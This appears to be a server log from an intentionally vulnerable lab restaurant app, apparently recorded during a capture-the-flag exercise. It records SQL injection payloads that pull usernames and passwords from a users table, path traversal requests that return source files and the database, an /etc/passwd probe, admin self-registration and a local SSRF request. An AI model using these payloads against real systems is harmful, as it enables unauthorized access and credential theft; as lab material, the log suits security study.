2026/08/05 19:05:05 [trigger] loaded 20 vulnerability definitions from ./vulns.json
2026/08/05 19:05:05 [main] trigger engine mode: both
🍽️  The Local Plate — Restaurant App
   Frontend  →  http://localhost:4444
   Backend   →  http://localhost:4443
   Version   →  1.7.0 (lab, advanced_vulns=true)

2026/08/05 19:05:05 [frontend] listening on :4444
2026/08/05 19:05:05 [backend] listening on :4443
2026/08/05 19:05:15 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=405µs ip=[::1]:10940 scanner=- ua="curl/8.7.1"
2026/08/05 19:05:15 [http] server=backend method=GET path=/api/debug/info route=/api/debug/info status=200 bytes=223 dur=504µs ip=[::1]:10941 scanner=- ua="curl/8.7.1"
2026/08/05 19:05:15 [http] server=backend method=GET path=/admin/users route=/admin/users status=200 bytes=651 dur=0s ip=[::1]:10942 scanner=- ua="curl/8.7.1"
2026/08/05 19:05:15 [http] server=backend method=GET path=/api/files?name=../../go.mod route=/api/files status=404 bytes=27 dur=0s ip=[::1]:10943 scanner=- ua="curl/8.7.1"
2026/08/05 19:05:32 [http] server=backend method=GET path=/api/debug/info route=/api/debug/info status=200 bytes=223 dur=660µs ip=[::1]:18575 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/debug/info route=/api/debug/info status=200 bytes=223 dur=0s ip=[::1]:48103 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/admin/users route=/admin/users status=200 bytes=651 dur=536µs ip=[::1]:48104 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=308µs ip=[::1]:48105 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/files?name=../../go.mod route=/api/files status=404 bytes=27 dur=548µs ip=[::1]:48107 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/files?name=../../../go.mod route=/api/files status=404 bytes=27 dur=506µs ip=[::1]:48108 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/files?name=../../main.go route=/api/files status=404 bytes=27 dur=0s ip=[::1]:48109 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/files?name=../../../main.go route=/api/files status=404 bytes=27 dur=506µs ip=[::1]:48110 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/files?file=../../go.mod route=/api/files status=400 bytes=36 dur=507µs ip=[::1]:48111 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/files?path=../../go.mod route=/api/files status=400 bytes=36 dur=0s ip=[::1]:48112 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=POST path=/register?role=admin route=/register status=400 bytes=33 dur=0s ip=[::1]:48113 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=POST path=/login route=/login status=400 bytes=33 dur=0s ip=[::1]:48114 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=POST path=/login route=/login status=400 bytes=33 dur=995µs ip=[::1]:48115 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/search?q=%27%20UNION%20SELECT%201,username,email,password,role,image_url,1%20FROM%20users-- route=/api/search status=500 bytes=26 dur=856µs ip=[::1]:48116 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:05:46 [http] server=backend method=GET path=/api/staff/panel route=/api/staff/panel status=200 bytes=1257 dur=2ms ip=[::1]:48121 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:04 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:55621 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:04 [http] server=backend method=GET path=/api/menu/0 UNION SELECT username,email,password,role FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:55622 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:04 [http] server=backend method=GET path=/api/menu/0+UNION+SELECT+1,username,email,password,role,image_url,1+FROM+users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:55623 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:04 [http] server=backend method=GET path=/api/menu/1;SELECT * FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=559µs ip=[::1]:55624 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:04 [http] server=backend method=GET path=/api/menu/0 route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:55625 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:04 [http] server=backend method=GET path=/api/search?q=%27%20OR%20%271%27%3D%271 route=/api/search status=200 bytes=2136 dur=666µs ip=[::1]:55626 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/search?q=%27%20UNION%20SELECT%20username%2Cemail%2Cpassword%2Crole%20FROM%20users-- route=/api/search status=500 bytes=26 dur=0s ip=[::1]:55627 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/search?q=%27%3B%20SELECT%20%2A%20FROM%20users-- route=/api/search status=200 bytes=447 dur=469µs ip=[::1]:55628 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/search?q=%25%27%20OR%201%3D1-- route=/api/search status=200 bytes=2136 dur=0s ip=[::1]:55629 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/search?q=x%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%20FROM%20users-- route=/api/search status=200 bytes=95 dur=768µs ip=[::1]:55630 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=POST path=/register route=/register status=400 bytes=33 dur=0s ip=[::1]:55631 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=POST path=/register route=/register status=201 bytes=55 dur=506µs ip=[::1]:55632 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=POST path=/api/user/update route=/api/user/update status=401 bytes=25 dur=0s ip=[::1]:55637 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/files?name=../../go.mod route=/api/files status=404 bytes=27 dur=0s ip=[::1]:55638 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/files?name=..%2F..%2Fgo.mod route=/api/files status=404 bytes=27 dur=555µs ip=[::1]:55639 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/files?name=....//go.mod route=/api/files status=404 bytes=27 dur=626µs ip=[::1]:55640 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/files?name=../../../../etc/passwd route=/api/files status=404 bytes=27 dur=988µs ip=[::1]:55641 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/files?name=../../main.go route=/api/files status=404 bytes=27 dur=787µs ip=[::1]:55642 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/files?name=static/../go.mod route=/api/files status=404 bytes=27 dur=6ms ip=[::1]:55643 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/files?name=static/../../go.mod route=/api/files status=200 bytes=202 dur=1ms ip=[::1]:55644 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:05 [http] server=backend method=GET path=/api/menu route=/api/menu status=200 bytes=2136 dur=511µs ip=[::1]:55678 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:06:14 [http] server=backend method=POST path=/register route=/register status=201 bytes=55 dur=508µs ip=[::1]:43581 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:14 [http] server=backend method=POST path=/login route=/login status=400 bytes=33 dur=0s ip=[::1]:16571 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:14 [http] server=backend method=GET path=/admin/users route=/admin/users status=403 bytes=22 dur=0s ip=[::1]:16572 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:14 [http] server=backend method=GET path=/api/user/profile route=/api/user/profile status=401 bytes=25 dur=0s ip=[::1]:16573 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:21 [http] server=backend method=POST path=/register?role=admin route=/register status=201 bytes=55 dur=1ms ip=[::1]:8470 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:21 [http] server=backend method=POST path=/login route=/login status=200 bytes=76 dur=505µs ip=[::1]:8471 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:21 [http] server=backend method=GET path=/admin/users route=/admin/users status=200 bytes=1000 dur=527µs ip=[::1]:8472 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:21 [http] server=backend method=GET path=/api/user/profile route=/api/user/profile status=400 bytes=34 dur=0s ip=[::1]:8473 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:39 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:8483 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:39 [http] server=backend method=GET path=/api/menu/99' UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:8484 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:39 [http] server=backend method=GET path=/api/menu/0 UNION SELECT NULL,username,email,password,role,image_url,1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:8485 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:39 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,group_concat(username,0x3a,password),3,4,5,6,7 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:8486 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:39 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../../go.mod route=/api/kitchen/recipes/view status=404 bytes=36 dur=1ms ip=[::1]:8487 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:40 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../../main.go route=/api/kitchen/recipes/view status=404 bytes=36 dur=0s ip=[::1]:8488 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:40 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../../handlers/admin.go route=/api/kitchen/recipes/view status=404 bytes=36 dur=0s ip=[::1]:8489 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:40 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../../restaurant.db route=/api/kitchen/recipes/view status=404 bytes=36 dur=0s ip=[::1]:8490 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:40 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=..%2F..%2Fgo.mod route=/api/kitchen/recipes/view status=404 bytes=36 dur=0s ip=[::1]:8491 scanner=- ua="curl/8.7.1"
2026/08/05 19:06:40 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=static/../go.mod route=/api/kitchen/recipes/view status=404 bytes=36 dur=506µs ip=[::1]:8492 scanner=- ua="curl/8.7.1"
2026/08/05 19:07:11 [http] server=backend method=GET path=/api/menu/1 route=/api/menu/{id} status=200 bytes=222 dur=0s ip=[::1]:18331 scanner=- ua="curl/8.7.1"
2026/08/05 19:07:11 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:18332 scanner=- ua="curl/8.7.1"
2026/08/05 19:07:11 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:18333 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:07:27 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,'x',1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=5ms ip=[::1]:18338 scanner=- ua="curl/8.7.1"
2026/08/05 19:07:27 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,'x',1 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:18339 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:07:40 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,0,0 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=963µs ip=[::1]:36462 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:07:41 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,0,0 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:36463 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:07:41 [http] server=backend method=GET path=/api/menu/0 UNION ALL SELECT 1,username,email,password,role,0,0 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:36465 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:07:41 [http] server=backend method=GET path=/api/menu/1 OR 1=1 UNION SELECT 1,username,email,password,role,0,0 FROM users-- route=/api/menu/{id} status=200 bytes=222 dur=565µs ip=[::1]:36466 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:03 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,0,0 FROM users route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:34335 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:03 [http] server=backend method=GET path=/api/menu/999 UNION SELECT 1,username,email,password,role,0,0 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=511µs ip=[::1]:34336 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:03 [http] server=backend method=GET path=/api/menu/0 OR (SELECT COUNT(*) FROM users WHERE username="admin")=1 route=/api/menu/{id} status=200 bytes=222 dur=746µs ip=[::1]:34337 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/1 route=/api/menu/{id} status=200 bytes=222 dur=0s ip=[::1]:52190 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/1 AND 1=0 UNION SELECT 1,username,email,password,role,0,0 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:52191 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/1 AND 1=0 route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:52192 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/0 AND 1=0 UNION SELECT 1,username,email,password,role,0,0 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=718µs ip=[::1]:52193 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/999 UNION SELECT 1,username,email,password,role,0,0 FROM users LIMIT 1-- route=/api/menu/{id} status=404 bytes=27 dur=553µs ip=[::1]:52194 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/0 UNION SELECT 1,username,email,password,role,0,0 FROM users LIMIT 1-- route=/api/menu/{id} status=404 bytes=27 dur=723µs ip=[::1]:52195 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/0 UNION ALL SELECT 1,username,email,password,role,0,0 FROM users LIMIT 1-- route=/api/menu/{id} status=404 bytes=27 dur=0s ip=[::1]:52196 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/-1 UNION SELECT 1,username,email,password,role,0,0 FROM users LIMIT 1-- route=/api/menu/{id} status=404 bytes=27 dur=505µs ip=[::1]:52197 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:17 [http] server=backend method=GET path=/api/menu/-1 OR 1=1 UNION SELECT 1,username,email,password,role,0,0 FROM users LIMIT 1-- route=/api/menu/{id} status=200 bytes=222 dur=509µs ip=[::1]:52198 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:08:27 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=pasta.txt route=/api/kitchen/recipes/view status=200 bytes=178 dur=550µs ip=[::1]:2836 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:27 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=salmon.txt route=/api/kitchen/recipes/view status=200 bytes=170 dur=508µs ip=[::1]:2837 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:27 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../go.mod route=/api/kitchen/recipes/view status=200 bytes=304 dur=0s ip=[::1]:2838 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:27 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../../go.mod route=/api/kitchen/recipes/view status=404 bytes=36 dur=0s ip=[::1]:2839 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:27 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=..%2Fgo.mod route=/api/kitchen/recipes/view status=200 bytes=304 dur=511µs ip=[::1]:2840 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:27 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=..\go.mod route=/api/kitchen/recipes/view status=200 bytes=305 dur=0s ip=[::1]:2841 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:28 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=..%5Cgo.mod route=/api/kitchen/recipes/view status=200 bytes=305 dur=506µs ip=[::1]:2842 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:28 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=C:/Users/User/Downloads/CTF%202026/sandbox/xVuln-main/go.mod route=/api/kitchen/recipes/view status=404 bytes=36 dur=0s ip=[::1]:2843 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:28 [http] server=backend method=GET path=/api/menu route=/api/menu status=200 bytes=2136 dur=3ms ip=[::1]:2845 scanner=- ua="Go-http-client/1.1"
2026/08/05 19:08:28 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=http://localhost:4443/api/menu route=/api/kitchen/recipes/view status=200 bytes=2490 dur=53ms ip=[::1]:2844 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:34 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../restaurant.db route=/api/kitchen/recipes/view status=200 bytes=2681024 dur=34ms ip=[::1]:64261 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:34 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../main.go route=/api/kitchen/recipes/view status=200 bytes=6980 dur=605µs ip=[::1]:64262 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:34 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../handlers/auth.go route=/api/kitchen/recipes/view status=200 bytes=4287 dur=1ms ip=[::1]:64263 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:35 [http] server=backend method=GET path=/api/debug/info route=/api/debug/info status=200 bytes=223 dur=786µs ip=[::1]:64264 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:35 [http] server=backend method=GET path=/api/debug/info route=/api/debug/info status=200 bytes=223 dur=0s ip=[::1]:64265 scanner=- ua="curl/8.7.1"
2026/08/05 19:08:35 [http] server=backend method=GET path=/admin/users route=/admin/users status=200 bytes=1000 dur=0s ip=[::1]:64266 scanner=- ua="curl/8.7.1"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/debug/info route=/api/debug/info status=200 bytes=222 dur=529µs ip=[::1]:1787 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/admin/users route=/admin/users status=200 bytes=1000 dur=505µs ip=[::1]:1788 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/staff/panel route=/api/staff/panel status=200 bytes=1257 dur=525µs ip=[::1]:1789 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=POST path=/register?role=admin route=/register status=201 bytes=55 dur=620µs ip=[::1]:1790 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=POST path=/login route=/login status=200 bytes=77 dur=511µs ip=[::1]:1791 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=POST path=/login route=/login status=200 bytes=77 dur=0s ip=[::1]:1792 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/admin/users route=/admin/users status=200 bytes=1122 dur=778µs ip=[::1]:1793 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/search?q=x%27%20UNION%20SELECT%201%2Cusername%2Cemail%2Cpassword%2Crole%2C0%2C0%20FROM%20users-- route=/api/search status=200 bytes=965 dur=505µs ip=[::1]:1794 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/menu/1 AND (SELECT COUNT(*) FROM users WHERE username='admin')=1 route=/api/menu/{id} status=200 bytes=222 dur=698µs ip=[::1]:1795 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/menu/999 UNION SELECT 1,username,email,password,role,0,0 FROM users-- route=/api/menu/{id} status=404 bytes=27 dur=598µs ip=[::1]:1796 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../go.mod route=/api/kitchen/recipes/view status=200 bytes=304 dur=517µs ip=[::1]:1797 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../main.go route=/api/kitchen/recipes/view status=200 bytes=6980 dur=1ms ip=[::1]:1798 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=../restaurant.db route=/api/kitchen/recipes/view status=200 bytes=2681024 dur=51ms ip=[::1]:1799 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/menu route=/api/menu status=200 bytes=2136 dur=586µs ip=[::1]:57418 scanner=- ua="Go-http-client/1.1"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/kitchen/recipes/view?source=http://localhost:4443/api/menu route=/api/kitchen/recipes/view status=200 bytes=2490 dur=32ms ip=[::1]:57417 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/files?name=static/../go.mod route=/api/files status=404 bytes=27 dur=558µs ip=[::1]:57419 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/files?name=static/../../go.mod route=/api/files status=200 bytes=202 dur=514µs ip=[::1]:57420 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/files?name=static/../main.go route=/api/files status=404 bytes=27 dur=613µs ip=[::1]:57421 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/debug/info route=/api/debug/info status=200 bytes=223 dur=558µs ip=[::1]:57418 scanner=- ua="Go-http-client/1.1"
2026/08/05 19:15:55 [http] server=backend method=POST path=/api/import-menu route=/api/import-menu status=200 bytes=87 dur=2ms ip=[::1]:57422 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=POST path=/login route=/login status=200 bytes=76 dur=0s ip=[::1]:57423 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/user/profile?id=1 route=/api/user/profile status=200 bytes=138 dur=558µs ip=[::1]:57424 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/menu route=/api/menu status=200 bytes=2136 dur=520µs ip=[::1]:57425 scanner=- ua="Python-urllib/3.12"
2026/08/05 19:15:55 [http] server=backend method=GET path=/api/menu route=/api/menu status=200 bytes=2136 dur=558µs ip=[::1]:57426 scanner=- ua=""
2026/08/05 19:23:55 [http] server=backend method=POST path=/login route=/login status=400 bytes=33 dur=0s ip=[::1]:37265 scanner=- ua="curl/8.7.1"
